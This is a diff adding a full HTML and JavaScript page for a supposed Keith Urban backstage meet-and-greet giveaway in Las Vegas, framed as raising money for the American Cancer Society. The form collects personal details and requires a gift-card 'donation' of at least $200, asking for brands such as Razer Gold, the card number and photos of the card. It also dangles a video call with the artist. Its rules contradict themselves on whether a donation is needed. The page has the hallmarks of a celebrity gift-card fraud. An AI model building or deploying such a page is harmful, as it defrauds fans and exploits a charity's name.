@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Backstage Pass Giveaway — Las Vegas</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Fraunces:opsz,wght@9..144,400;9..144,600&family=Space+Mono:wght@400;700&display=swap');
+
+  :root{
+    --curtain: #1a0e14;
+    --curtain-deep: #0d0709;
+    --velvet: #3b0f1e;
+    --gold: #d4af37;
+    --gold-bright: #f4d968;
+    --marquee-white: #fdf6e8;
+    --ink: #f4ead9;
+    --ink-dim: #c9b8a3;
+    --line: rgba(212,175,55,0.35);
+    --error: #ff6b6b;
+  }
+
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:
+      radial-gradient(ellipse at 50% -10%, rgba(212,175,55,0.10), transparent 55%),
+      linear-gradient(180deg, var(--curtain) 0%, var(--curtain-deep) 100%);
+    color:var(--ink);
+    font-family:'Fraunces', serif;
+    min-height:100vh;
+    padding:48px 20px 80px;
+  }
+
+  .wrap{max-width:640px;margin:0 auto;}
+
+  /* Marquee header */
+  .marquee{
+    text-align:center;
+    padding-bottom:28px;
+    margin-bottom:36px;
+    border-bottom:1px dashed var(--line);
+    position:relative;
+  }
+  .eyebrow{
+    font-family:'Space Mono', monospace;
+    font-size:11px;
+    letter-spacing:0.32em;
+    text-transform:uppercase;
+    color:var(--gold);
+    margin-bottom:14px;
+  }
+  .eyebrow .dot{
+    display:inline-block;width:6px;height:6px;border-radius:50%;
+    background:var(--gold-bright);margin-right:8px;
+    box-shadow:0 0 8px var(--gold-bright);
+    animation:pulse 1.8s ease-in-out infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.35;}}
+  h1{
+    font-family:'Bebas Neue', sans-serif;
+    font-size:clamp(40px,9vw,64px);
+    letter-spacing:0.03em;
+    line-height:0.95;
+    margin:0 0 10px;
+    background:linear-gradient(180deg, var(--gold-bright), var(--gold) 60%, #a9822a);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+    text-shadow:0 0 40px rgba(212,175,55,0.15);
+  }
+  .sub{
+    font-size:16px;
+    color:var(--ink-dim);
+    max-width:440px;
+    margin:0 auto;
+    line-height:1.5;
+  }
+
+  /* Cause panel */
+  .cause{
+    background:rgba(212,175,55,0.06);
+    border:1px solid var(--line);
+    border-radius:2px;
+    padding:20px 22px;
+    margin-bottom:36px;
+    font-size:14px;
+    line-height:1.6;
+    color:var(--ink-dim);
+  }
+  .cause b{color:var(--ink);font-weight:600;}
+  .cause .fill{
+    color:var(--gold-bright);
+    border-bottom:1px dotted var(--gold);
+  }
+
+  /* Form Styling */
+  form{
+    background:var(--velvet);
+    border:1px solid var(--line);
+    border-radius:4px;
+    padding:36px 32px;
+    position:relative;
+  }
+
+  .section-label{
+    font-family:'Space Mono', monospace;
+    font-size:11px;
+    letter-spacing:0.2em;
+    text-transform:uppercase;
+    color:var(--gold);
+    margin:0 0 18px;
+    padding-bottom:8px;
+    border-bottom:1px solid var(--line);
+  }
+  .section-label:not(:first-child){margin-top:32px;}
+
+  label{
+    display:block;
+    font-family:'Space Mono', monospace;
+    font-size:12px;
+    letter-spacing:0.04em;
+    color:var(--ink-dim);
+    margin-bottom:6px;
+  }
+  .field{margin-bottom:18px;}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+  @media (max-width:520px){.row{grid-template-columns:1fr;}}
+
+  input[type=text], input[type=email], input[type=tel], input[type=number], input[type=file], textarea{
+    width:100%;
+    background:rgba(0,0,0,0.25);
+    border:1px solid rgba(212,175,55,0.3);
+    color:var(--ink);
+    font-family:'Fraunces', serif;
+    font-size:15px;
+    padding:11px 12px;
+    border-radius:2px;
+    transition:border-color 0.15s ease, background 0.15s ease;
+  }
+  input[type=file]{
+    font-family:'Space Mono', monospace;
+    font-size:12px;
+    padding:8px 10px;
+    cursor:pointer;
+  }
+  textarea{resize:vertical;min-height:80px;}
+  input:focus, textarea:focus{
+    outline:none;
+    border-color:var(--gold-bright);
+    background:rgba(0,0,0,0.35);
+  }
+  input:focus-visible, textarea:focus-visible, button:focus-visible{
+    outline:2px solid var(--gold-bright);
+    outline-offset:2px;
+  }
+  ::placeholder{color:rgba(244,234,217,0.28);}
+
+  .amount-options{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:10px;
+    margin-bottom:12px;
+  }
+  .amount-btn{
+    background:rgba(0,0,0,0.2);
+    border:1px solid rgba(212,175,55,0.3);
+    color:var(--ink);
+    font-family:'Space Mono', monospace;
+    font-size:14px;
+    padding:12px 8px;
+    border-radius:2px;
+    cursor:pointer;
+    text-align:center;
+    transition:all 0.15s ease;
+  }
+  .amount-btn:hover{border-color:var(--gold-bright);}
+  .amount-btn.active{
+    background:rgba(212,175,55,0.18);
+    border-color:var(--gold-bright);
+    color:var(--gold-bright);
+  }
+  .min-note{
+    font-family:'Space Mono', monospace;
+    font-size:11px;
+    color:var(--ink-dim);
+    margin-top:-4px;
+    margin-bottom:16px;
+  }
+  .security-warning {
+    font-family: 'Space Mono', monospace;
+    font-size: 11px;
+    color: var(--gold-bright);
+    background: rgba(212,175,55,0.1);
+    border: 1px dashed var(--line);
+    padding: 8px 10px;
+    border-radius: 2px;
+    margin-top: 6px;
+    margin-bottom: 12px;
+    line-height: 1.4;
+  }
+
+  .checkbox-field{
+    display:flex;
+    align-items:flex-start;
+    gap:10px;
+    margin-bottom:16px;
+  }
+  .checkbox-field input{width:16px;height:16px;margin-top:3px;accent-color:var(--gold);}
+  .checkbox-field label{margin:0;font-size:13px;line-height:1.5;color:var(--ink-dim);}
+
+  .submit-btn{
+    width:100%;
+    background:linear-gradient(180deg, var(--gold-bright), var(--gold));
+    border:none;
+    color:var(--curtain-deep);
+    font-family:'Bebas Neue', sans-serif;
+    font-size:20px;
+    letter-spacing:0.06em;
+    padding:16px;
+    border-radius:2px;
+    cursor:pointer;
+    margin-top:8px;
+    transition:transform 0.12s ease, box-shadow 0.12s ease;
+  }
+  .submit-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(212,175,55,0.25);}
+  .submit-btn:active{transform:translateY(0);}
+
+  .error{
+    color:var(--error);
+    font-family:'Space Mono', monospace;
+    font-size:12px;
+    margin-top:4px;
+    margin-bottom:14px;
+    display:none;
+  }
+  .error.show{display:block;}
+
+  .disclosure{
+    text-align:center;
+    font-family:'Space Mono', monospace;
+    font-size:10.5px;
+    line-height:1.7;
+    color:rgba(201,184,163,0.6);
+    margin-top:28px;
+    padding-top:20px;
+    border-top:1px dashed var(--line);
+  }
+
+  .rules-panel{
+    background:var(--velvet);
+    border:1px solid var(--line);
+    border-radius:4px;
+    margin-top:20px;
+    padding:20px 24px;
+  }
+  .rules-panel summary{
+    font-family:'Space Mono', monospace;
+    font-size:12px;
+    letter-spacing:0.1em;
+    text-transform:uppercase;
+    color:var(--gold);
+    cursor:pointer;
+  }
+  .rules-content{
+    margin-top:16px;
+    padding-top:16px;
+    border-top:1px dashed var(--line);
+    font-size:12.5px;
+    line-height:1.6;
+    color:var(--ink-dim);
+  }
+  .rules-content p{margin:0 0 12px;}
+  .rules-content b{color:var(--ink);}
+
+  .confirm{
+    display:none;
+    text-align:center;
+    padding:40px 20px;
+  }
+  .confirm.show{display:block;}
+  .confirm h2{
+    font-family:'Bebas Neue', sans-serif;
+    font-size:36px;
+    letter-spacing:0.03em;
+    color:var(--gold-bright);
+    margin-bottom:10px;
+  }
+  .confirm p{color:var(--ink-dim);font-size:14px;line-height:1.6;max-width:400px;margin:0 auto;}
+
+  @media (prefers-reduced-motion: reduce){
+    .eyebrow .dot{animation:none;}
+    .submit-btn:hover{transform:none;}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <div class="marquee">
+    <div class="eyebrow"><span class="dot"></span>Limited Availability</div>
+    <h1>Meet &amp; Greet<br>Backstage, Las Vegas</h1>
+    <p class="sub">Enter for your chance to meet Keith Urban, go backstage, and share an unforgettable dinner experience! — every entry is a donation to <span class="fill"> American Cancer Society</span>.</p>
+  </div>
+
+  <div class="cause">
+    <b>Where your donation goes:</b> 100% of entry donations support the <span class="fill">American Cancer Society</span>, a 501(c)(3) nonprofit (EIN 13-1788491) dedicated to research, patient support, and care for people with cancer. card/cash donations are tax-deductible to the extent permitted by law.
+  </div>
+
+  <form 
+    id="entryForm" 
+    name="backstage-giveaway" 
+    method="POST" 
+    data-netlify="true" 
+    data-netlify-honeypot="bot-field" 
+    enctype="multipart/form-data" 
+    novalidate
+  >
+    <!-- Netlify Hidden Form Inputs -->
+    <input type="hidden" name="form-name" value="backstage-giveaway">
+    <p style="display:none">
+      <label>Don't fill this out if you're human: <input name="bot-field"></label>
+    </p>
+
+    <div class="section-label">Your Info</div>
+
+    <div class="row">
+      <div class="field">
+        <label for="firstName">First name</label>
+        <input type="text" id="firstName" name="firstName" required>
+      </div>
+      <div class="field">
+        <label for="lastName">Last name</label>
+        <input type="text" id="lastName" name="lastName" required>
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" placeholder="you@example.com" required>
+      <div class="error" id="emailError">Enter a valid email address.</div>
+    </div>
+
+    <div class="row">
+      <div class="field">
+        <label for="phone">Phone</label>
+        <input type="tel" id="phone" name="phone" placeholder="(555) 555-5555" required>
+      </div>
+      <div class="field">
+        <label for="social">Social handle (optional)</label>
+        <input type="text" id="social" name="social" placeholder="@yourhandle">
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="story">Why do you want to be there? (optional)</label>
+      <textarea id="story" name="story" placeholder="Tell us a bit about your story..."></textarea>
+    </div>
+
+    <div class="section-label">Donation Method</div>
+    <div class="amount-options" id="methodOptions">
+      <button type="button" class="amount-btn method-btn active" data-method="giftcard">Gift Card</button>
+    </div>
+
+    <div id="giftCardPanel">
+      <div class="cause" style="margin-bottom:16px;">
+        Have an unused gift card worth $200 or more? You can donate it to help save lives.
+      </div>
+      <div class="field">
+        <label for="giftCardBrand">Gift card brand(s)</label>
+        <input type="text" id="giftCardBrand" name="giftCardBrand" placeholder="e.g. Razer Gold, Visa, Ebay" required>
+      </div>
+      <div class="field">
+        <label for="giftCardValue">Estimated total value ($, min 200)</label>
+        <input type="number" id="giftCardValue" name="giftCardValue" min="200" step="1" placeholder="200" required>
+      </div>
+      <div class="min-note">$200 minimum estimated value per entry.</div>
+      <div class="field">
+        <label for="giftCardNumber">Gift card number (optional)</label>
+        <input type="text" id="giftCardNumber" name="giftCardNumber" placeholder="e.g. XXXX-XXXX-XXXX">
+      </div>
+      
+      <!-- Proof Image Upload Fields (3 Separate Inputs for Netlify) -->
+      <div class="field">
+        <label>Proof of Gift Card (require Photo Uploads — Up to 3 images)</label>
+        <input type="file" name="cardProof1" class="proof-file" accept="image/jpeg,image/png,image/webp">
+        <input type="file" name="cardProof2" class="proof-file" accept="image/jpeg,image/png,image/webp" style="margin-top:8px;">
+        <input type="file" name="cardProof3" class="proof-file" accept="image/jpeg,image/png,image/webp" style="margin-top:8px;">
+       
+       
+        <div class="error" id="fileError">Please upload valid image files (JPG, PNG, WebP) under 5MB each.</div>
+      </div>
+
+      <div class="error" id="giftCardError">Enter a card brand and a value of at least $200.</div>
+    </div>
+
+    <div class="checkbox-field">
+      <input type="checkbox" id="ageConfirm" name="ageConfirm" required>
+      <label for="ageConfirm">I confirm I am 18 years or older and have read the official rules.</label>
+    </div>
+    <div class="error" id="ageError">You must confirm eligibility to continue.</div>
+
+    <button type="submit" class="submit-btn" id="submitBtn">Continue to Secure Donation →</button>
+
+    <div class="disclosure">
+      NO DONATION IS REQUIRED TO ENTER OR WIN.<br>
+      Void where prohibited. See official rules below for free/alternate entry method,<br>
+      odds of winning, and full terms.
+    </div>
+
+    <div class="video-call-note" style="margin-top:18px;padding:14px 16px;border:1px solid var(--line);background:rgba(212,175,55,0.06);font-size:13px;line-height:1.6;color:var(--ink-dim);text-align:center;">
+      <b style="color:var(--ink);">Didn't win the backstage experience?</b><br>
+      Eligible entrants who aren't selected may have an opportunity to participate in a special video call with the artist. Full eligibility and video-call details will be provided in the official rules.
+    </div>
+  </form>
+
+  <details class="rules-panel">
+    <summary>Official Rules</summary>
+    <div class="rules-content">
+      <p><b>NO PURCHASE OR DONATION NECESSARY TO ENTER OR WIN.</b> A purchase or donation will not increase your chances of winning. Void where prohibited by law.</p>
+      <p><b>1. Sponsor.</b> <span class="fill">Keith Urban</span>.</p>
+      <p><b>2. Eligibility.</b> Open to legal residents who are 18 years of age or older at the time of entry. Employees of Sponsor, their immediate families, and household members are not eligible.</p>
+      <p><b>3. Promotion Period.</b> Entries will be accepted from <span class="fill">August 15</span> through <span class="fill">October 05</span>.</p>
+      <p><b>4. How to Enter.</b> Complete the entry form and donate a minimum of $200 (cash/card or gift card).</p>
+      <p><b>5. Odds of Winning.</b> Odds depend on the total number of eligible entries received.</p>
+      <p><b>6. Prize.</b> One winner will receive a meet & greet and backstage experience at <span class="fill">BleauLive Theater at Fontainebleau Las Vegas (2777 S Las Vegas Blvd), on the applicable event date</span>. Approximate retail value: <span class="fill">[ARV]</span>. Prize is non-transferable; no cash substitution except at Sponsor's discretion.</p>
+      <p><b>7. Winner Selection & Notification.</b> Winner will be selected by random drawing on or about <span class="fill">October 08, 2026</span> and notified by email/phone within 5 days.</p>
+      <p><b>8. Publicity Release.</b> By accepting the prize, winner grants Sponsor permission to use their name and likeness for promotional purposes without additional compensation, except where prohibited by law.</p>
+      <p><b>9. Privacy.</b> Information collected will be used to administer this promotion in accordance with Sponsor's privacy policy.</p>
+    </div>
+  </details>
+
+  <div class="confirm" id="confirmPanel">
+    <h2>Entry Recorded</h2>
+    <p id="confirmText"></p>
+  </div>
+
+</div>
+
+<script>
+(function(){
+  // Helper to sanitize text preventing HTML injection
+  function escapeHTML(str) {
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  const form = document.getElementById('entryForm');
+  const fileInputs = document.querySelectorAll('.proof-file');
+  const fileError = document.getElementById('fileError');
+  const submitBtn = document.getElementById('submitBtn');
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    let valid = true;
+
+    // Email validation
+    const email = document.getElementById('email');
+    const emailError = document.getElementById('emailError');
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailPattern.test(email.value.trim())) {
+      emailError.classList.add('show');
+      valid = false;
+    } else {
+      emailError.classList.remove('show');
+    }
+
+    // Gift card details validation
+    const giftCardBrandInput = document.getElementById('giftCardBrand');
+    const giftCardValueInput = document.getElementById('giftCardValue');
+    const giftCardBrand = giftCardBrandInput.value.trim();
+    const amount = parseInt(giftCardValueInput.value, 10);
+    const giftCardError = document.getElementById('giftCardError');
+
+    if (!giftCardBrand || !amount || amount < 200 || !Number.isInteger(amount)) {
+      giftCardError.classList.add('show');
+      valid = false;
+    } else {
+      giftCardError.classList.remove('show');
+    }
+
+    // Individual file validation (Check format and size for selected files)
+    const validTypes = ['image/jpeg', 'image/png', 'image/webp'];
+    const maxSize = 5 * 1024 * 1024; // 5 MB per file
+    let fileValid = true;
+
+    fileInputs.forEach(input => {
+      if (input.files.length > 0) {
+        const file = input.files[0];
+        if (!validTypes.includes(file.type) || file.size > maxSize) {
+          fileValid = false;
+        }
+      }
+    });
+
+    if (!fileValid) {
+      fileError.textContent = 'Please ensure all uploaded files are JPG, PNG, or WebP under 5MB each.';
+      fileError.classList.add('show');
+      valid = false;
+    } else {
+      fileError.classList.remove('show');
+    }
+
+    // Age confirmation check
+    const ageConfirm = document.getElementById('ageConfirm');
+    const ageError = document.getElementById('ageError');
+    if (!ageConfirm.checked) {
+      ageError.classList.add('show');
+      valid = false;
+    } else {
+      ageError.classList.remove('show');
+    }
+
+    // Required contact info check
+    const rawFirstName = document.getElementById('firstName').value.trim();
+    const rawLastName = document.getElementById('lastName').value.trim();
+    const rawPhone = document.getElementById('phone').value.trim();
+
+    if (!rawFirstName || !rawLastName || !rawPhone) {
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    // Submit form via Netlify AJAX submission
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Submitting...';
+
+    const formData = new FormData(form);
+
+    fetch('/', {
+      method: 'POST',
+      body: formData
+    })
+    .then(response => {
+      if (response.ok) {
+        const safeFirstName = escapeHTML(rawFirstName);
+        const safeGiftCardBrand = escapeHTML(giftCardBrand);
+
+        const confirmText = document.getElementById('confirmText');
+        confirmText.innerHTML = 'Thanks, <span id="confirmNameInline">' + safeFirstName + '</span> — your gift card donation information has been received. Next, Thank you for your support ' + safeGiftCardBrand + ' gift card(s) (estimated value $' + amount + '). Watch your email for confirmation and next steps.';
+        
+        form.style.display = 'none';
+        document.getElementById('confirmPanel').classList.add('show');
+      } else {
+        alert('There was a problem submitting your form. Please try again.');
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Continue to Secure Donation →';
+      }
+    })
+    .catch(error => {
+      alert('Form submission failed. Please check your connection and try again.');
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Continue to Secure Donation →';
+    });
+  });
+})();
+</script>
+</body>
+</html>
